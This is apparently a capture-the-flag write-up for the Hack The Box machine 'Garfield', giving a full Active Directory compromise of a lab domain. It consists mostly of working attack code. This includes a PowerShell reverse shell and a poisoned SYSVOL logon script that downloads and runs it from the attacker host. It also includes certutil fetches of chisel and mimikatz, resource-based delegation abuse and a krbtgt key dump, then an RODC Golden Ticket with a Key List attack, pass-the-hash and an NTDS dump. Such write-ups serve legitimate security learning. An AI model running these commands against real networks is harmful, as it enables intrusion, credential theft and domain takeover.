# HTB Garfield — Full Writeup

**Machine:** Garfield  
**Difficulty:** Hard (Active Directory / RODC focused)  
**OS:** Windows Server 2019 (Domain Controller + RODC)  
**Domain:** `garfield.htb`  
**Hosts:**
- `DC01.garfield.htb` — `10.129.244.207` (Writable Domain Controller)
- `RODC01.garfield.htb` — `192.168.100.2` (Read-Only Domain Controller, internal network)

---

## 1. Reconnaissance

### Nmap Scan

```bash
nmap -sSVC -A 10.129.244.207
```

**Key open ports:**

| Port  | Service              | Notes                                      |
|-------|----------------------|--------------------------------------------|
| 53    | DNS                  | Simple DNS Plus                            |
| 88    | Kerberos             |                                            |
| 135   | MSRPC                |                                            |
| 139   | NetBIOS-SSN          |                                            |
| 389   | LDAP                 | Domain: `garfield.htb`                     |
| 445   | SMB                  |                                            |
| 464   | kpasswd              |                                            |
| 593   | RPC over HTTP        |                                            |
| 636   | LDAPS                |                                            |
| 3268  | Global Catalog       |                                            |
| 3269  | Global Catalog SSL   |                                            |
| 3389  | RDP                  | `DC01.garfield.htb`                        |

From RDP NTLM info:
- NetBIOS Domain: `GARFIELD`
- DNS Domain: `garfield.htb`
- Product Version: Windows Server 2019 (10.0.17763)

### User Enumeration

Via SMB / enum4linux / crackmapexec / BloodHound, the following users were identified:

- `j.arbuckle`
- `l.wilson` (Liz Wilson)
- `l.wilson_adm` (Liz Wilson ADM)

Machine accounts `DC01$` and `RODC01$` are also present.

---

## 2. Initial Access — j.arbuckle → Logon Script Abuse

### Credentials

User `j.arbuckle` has the password:

```
Th1sD4mnC4t!@1978
```

These credentials provide access to `SYSVOL`.

### Writable SYSVOL Scripts

```bash
smbclient //10.129.244.207/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978'
```

Inside:

```
\garfield.htb\scripts\
    printerDetect.bat
```

The `scripts` directory is **writable**.

The original `printerDetect.bat` is a harmless printer detection script. It can be replaced with a malicious one.

### Preparing the Reverse Shell

On the attacker machine, create a PowerShell reverse shell:

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.15.27",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
    $data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback=(iex $data 2>&1|Out-String);
    $sendback2=$sendback+"PS "+(pwd).Path+"> ";
    $sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

Save it as `shell.ps1` and start an HTTP server:

```bash
python3 -m http.server 8000
```

Content of the malicious `printerDetect.bat`:

```bat
@echo off
powershell -NoP -NonI -W Hidden -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.15.27:8000/shell.ps1')"
```

Upload it back:

```bash
smbclient //10.129.244.207/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978' \
  -c "cd garfield.htb\scripts; put printerDetect.bat printerDetect.bat"
```

### Setting scriptPath

Using `bloodyAD`, set the `scriptPath` attribute for user **Liz Wilson**:

```bash
bloodyAD -u j.arbuckle -p 'Th1sD4mnC4t!@1978' -d garfield.htb --host 10.129.244.207 \
  set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" scriptPath -v printerDetect.bat
```

Verification:

```bash
bloodyAD -u j.arbuckle -p 'Th1sD4mnC4t!@1978' -d garfield.htb --host 10.129.244.207 \
  get object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" --attr scriptPath
```

When user `l.wilson` logs on (or a logon trigger occurs), the malicious `printerDetect.bat` is executed → reverse shell as `l.wilson`.

> **Note:** On the actual machine the shell arrived after a specific event (sometimes related to a change log / logon). Keep the listener (`nc -lvnp 4444`) and HTTP server running.

---

## 3. Privilege Escalation — l.wilson → l.wilson_adm

From the `l.wilson` session (or via further credential discovery) access is obtained to:

```
l.wilson_adm : Password123!
```

This account is (or can be) added to the **RODC Administrators** group.

```powershell
Add-ADGroupMember -Identity "RODC Administrators" -Members l.wilson_adm
Get-ADGroupMember "RODC Administrators"
```

Membership in `RODC Administrators` grants significant rights over the RODC object (including the ability to modify the Password Replication Policy and perform certain administrative actions).

---

## 4. Resource-Based Constrained Delegation (RBCD) on RODC01

Goal: obtain `Administrator` access on `RODC01$`.

### 4.1 Creating a Machine Account

```bash
impacket-addcomputer -computer-name 'FAKE$' -computer-pass 'Password123!' \
  -dc-ip 10.129.244.207 'garfield.htb/l.wilson_adm:Password123!'
```

### 4.2 Configuring RBCD

```bash
impacket-rbcd -delegate-from 'FAKE$' -delegate-to 'RODC01$' \
  -dc-ip 10.129.244.207 -action write \
  'garfield.htb/l.wilson_adm:Password123!'
```

`FAKE$` can now impersonate users on `RODC01$` via S4U2Proxy.

### 4.3 Obtaining a Service Ticket

Due to significant clock skew between the attacker machine and the DC, time synchronization is required:

```bash
faketime "$(ntpdate -q 10.129.244.207 2>&1 | grep -oP '\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}')" \
impacket-getST -spn 'cifs/RODC01.garfield.htb' -impersonate Administrator \
  -dc-ip 10.129.244.207 'garfield.htb/FAKE$:Password123!'
```

Resulting ticket file:
```
Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
```

### 4.4 Pivoting with Chisel

The RODC is located on the internal network (`192.168.100.2`), so a tunnel is required.

**On the attacker machine:**
```bash
chisel server -p 8888 --reverse
```

**On the compromised host (l.wilson_adm / DC):**
```cmd
certutil -urlcache -split -f http://10.10.15.27:8000/chisel.exe chisel.exe
.\chisel.exe client 10.10.15.27:8888 R:1080:socks
```

Then use `proxychains` with SOCKS5 on `127.0.0.1:1080`.

### 4.5 PSEXEC to RODC01

```bash
export KRB5CCNAME=Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache

proxychains -q faketime "$(ntpdate -q 10.129.244.207 2>&1 | grep -oP '\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}')" \
impacket-psexec -k -no-pass -dc-ip 10.129.244.207 -target-ip 192.168.100.2 \
  garfield.htb/Administrator@RODC01.garfield.htb
```

This yields a SYSTEM/Administrator shell on RODC01.

---

## 5. Dumping krbtgt_8245 (RODC-specific krbtgt)

RODCs have a **separate** `krbtgt_XXXX` account (in this case `krbtgt_8245`) used to sign tickets issued by that RODC.

Using mimikatz:

```cmd
cd C:\Windows\Temp
certutil -urlcache -split -f http://10.10.15.27:8000/mimikatz.exe mimikatz.exe

mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt_8245" "exit"
```

**Important data obtained:**

```
User : krbtgt_8245
NTLM : 445aa4221e751da37a10241d962780e2

aes256_hmac : d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240
aes128_hmac : 124c0fd09f5fa4efca8d9f1da91369e5
```

The AES256 key is required for the RODC Golden Ticket.

---

## 6. Manipulating the Password Replication Policy (PRP)

For the Key List attack to work against `Administrator`, the account must be added to the RODC’s `msDS-RevealOnDemandGroup` and removed from `msDS-NeverRevealGroup`.

```bash
# Add Administrator to RevealOnDemandGroup
bloodyAD -u l.wilson_adm -p 'Password123!' -d garfield.htb --host 10.129.244.207 \
  set object "CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb" \
  msDS-RevealOnDemandGroup -v "CN=Administrator,CN=Users,DC=garfield,DC=htb"

# Clear NeverRevealGroup (do not use -v "")
bloodyAD -u l.wilson_adm -p 'Password123!' -d garfield.htb --host 10.129.244.207 \
  set object "CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb" \
  msDS-NeverRevealGroup
```

Verification:

```bash
bloodyAD -u l.wilson_adm -p 'Password123!' -d garfield.htb --host 10.129.244.207 \
  get object "CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb" \
  --attr msDS-RevealOnDemandGroup,msDS-NeverRevealGroup
```

---

## 7. RODC Golden Ticket + Key List Attack

### 7.1 Rubeus Version Requirements

Version **2.2.0** has a bug with RODC Golden Tickets (results in `KRB_AP_ERR_BAD_INTEGRITY`).  
Version **≥ 2.3.3** is required.

```bash
# Example download of a working version
wget https://github.com/gzzcoo/Rubeus/raw/main/Rubeus.exe -O Rubeus_new.exe
```

Upload it to the RODC and verify:

```cmd
.\Rubeus.exe
# Should display v2.3.3
```

### 7.2 Creating the RODC Golden Ticket

```cmd
.\Rubeus.exe golden /rodcNumber:8245 \
  /flags:forwardable,renewable,enc_pa_rep \
  /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 \
  /user:Administrator /id:500 \
  /domain:garfield.htb \
  /sid:S-1-5-21-2502726253-3859040611-225969357 \
  /nowrap /outfile:ticket.kirbi
```

Rubeus saves the file with a timestamp in the name, for example:

```
ticket_2026_11_03_21_20_22_Administrator_to_krbtgt@GARFIELD.HTB.kirbi
```

### 7.3 Key List Attack (asktgs /keyList)

```cmd
.\Rubeus.exe asktgs /enctype:aes256 /keyList \
  /service:krbtgt/garfield.htb \
  /dc:DC01.garfield.htb \
  /ticket:ticket_2026_11_03_21_20_22_Administrator_to_krbtgt@GARFIELD.HTB.kirbi \
  /nowrap
```

**Successful output contains:**

```
[+] TGS request successful!
...
Password Hash            :  EE238F6DEBC752010428F20875B092D5
```

This is the **real NTLM hash** of the domain Administrator account.

---

## 8. Domain Admin on DC01

### Pass-the-Hash

```bash
proxychains -q faketime "$(ntpdate -q 10.129.244.207 2>&1 | grep -oP '\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}')" \
impacket-psexec -hashes :EE238F6DEBC752010428F20875B092D5 \
  garfield.htb/Administrator@10.129.244.207
```

Or via Evil-WinRM:

```bash
evil-winrm -i 10.129.244.207 -u Administrator -H EE238F6DEBC752010428F20875B092D5
```

### Full NTDS Dump (optional)

```bash
impacket-secretsdump -hashes :EE238F6DEBC752010428F20875B092D5 \
  garfield.htb/Administrator@10.129.244.207
```

This retrieves all domain hashes, including `krbtgt`, `j.arbuckle`, `l.wilson`, `l.wilson_adm`, etc.

---

## 9. Flags

### root.txt
```
C:\Users\Administrator\Desktop\root.txt
```
(on DC01)

### user.txt
Located on the Desktop of user `l.wilson` or `l.wilson_adm`:

```cmd
type C:\Users\l.wilson\Desktop\user.txt
type C:\Users\l.wilson_adm\Desktop\user.txt
```

---

## Attack Path Summary

```
1. j.arbuckle (SYSVOL write access)
      ↓ scriptPath + malicious printerDetect.bat
2. l.wilson (reverse shell)
      ↓ credentials / privileges
3. l.wilson_adm (RODC Administrators)
      ↓ RBCD (FAKE$ → RODC01$)
4. Administrator on RODC01
      ↓ mimikatz → krbtgt_8245 AES256
5. PRP manipulation (RevealOnDemandGroup)
      ↓ RODC Golden Ticket + Key List
6. Real Administrator NTLM hash
      ↓ PTH
7. Domain Admin on DC01 → Flags
```

---

## Useful Commands / Tips

### Clock Skew
Almost all Kerberos operations required time synchronization:

```bash
faketime "$(ntpdate -q 10.129.244.207 2>&1 | grep -oP '\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}')" <command>
```

### Rubeus Versions
- 2.2.0 → `KRB_AP_ERR_BAD_INTEGRITY` on Key List
- ≥ 2.3.3 → works correctly

### bloodyAD — Clearing an Attribute
```bash
# Incorrect (invalidAttributeSyntax):
set object ... msDS-NeverRevealGroup -v ""

# Correct:
set object ... msDS-NeverRevealGroup
```

### Chisel
Ensure the client and server versions are compatible (or close).

---

## Conclusion

**Garfield** is an excellent machine for practicing modern RODC attacks:

- Writable SYSVOL + Logon Script
- Resource-Based Constrained Delegation (RBCD)
- Extraction of `krbtgt_<RODCNumber>`
- Password Replication Policy manipulation
- RODC Golden Ticket + **Key List Attack**

The key takeaway of the entire chain is understanding that an RODC has its own `krbtgt_XXXX` account, which can be used to perform a Key List attack and obtain the real domain Administrator hash.